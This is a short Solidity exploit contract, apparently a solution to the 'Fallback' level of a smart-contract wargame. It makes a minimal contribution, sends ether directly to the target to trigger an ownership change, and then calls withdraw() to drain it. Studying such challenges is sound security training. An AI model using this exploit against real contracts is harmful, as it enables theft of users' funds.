// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Fallback} from "./Fallback.sol";
contract FallbackHack {
  Fallback fallbackContract;
  constructor(Fallback _fallbackContract){
    fallbackContract = _fallbackContract;
  }
  function hack() external payable { 
     fallbackContract.contribute{value:0.00001 ether}();
     
     (bool s,) = address(fallbackContract).call{value:0.1 ether}("");
     if(s){
        fallbackContract.withdraw();
     }
  }
  receive() external payable {}
}